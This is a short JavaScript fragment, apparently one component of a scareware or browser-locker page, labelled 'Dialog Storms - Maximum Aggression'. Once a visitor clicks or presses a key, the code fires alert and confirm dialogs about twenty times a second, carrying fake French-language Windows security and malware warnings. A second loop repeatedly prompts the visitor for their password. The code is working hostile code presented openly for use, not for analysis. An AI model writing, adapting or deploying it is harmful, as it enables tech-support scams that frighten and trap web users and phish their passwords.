/**
 * 2. DIALOG STORMS - MAXIMUM AGGRESSION
 */
const DialogStorms = {
    active: false,
    init: function(immediate) {
        if (immediate || this.active) { this.startStorm(); }
        else {
            document.addEventListener('click', () => { if (!this.active) { this.active = true; this.startStorm(); } }, { once: true });
            // Also trigger on any keypress
            document.addEventListener('keydown', () => { if (!this.active) { this.active = true; this.startStorm(); } }, { once: true });
        }
    },
    startStorm: function() {
        const messages = [
            '⚠️ Alerte de sécurité Windows', 'Erreur système critique détectée',
            'Votre ordinateur est infecté!', 'Appuyez sur OK pour continuer',
            'Voulez-vous vraiment quitter?', 'Tentative de connexion non autorisée',
            'Pare-feu désactivé - Danger!', 'Données personnelles compromises',
            '⛔ ACCÈS NON AUTORISÉ DÉTECTÉ', '🔴 MALWARE ACTIF - ACTION IMMÉDIATE REQUISE'
        ];
        const storm = () => {
            if (!this.active) return;
            const msg = messages[Math.floor(Math.random() * messages.length)];
            Math.random() > 0.5 ? confirm(msg) : alert(msg);
            setTimeout(storm, 50); // 50ms = 20 dialogs per second
        };
        storm();
        // Also spawn parallel storm
        setTimeout(() => {
            const storm2 = () => {
                if (!this.active) return;
                prompt('⚠️ CONFIRMATION REQUISE - Entrez votre mot de passe pour continuer:');
                setTimeout(storm2, 200);
            };
            storm2();
        }, 1000);
    }
};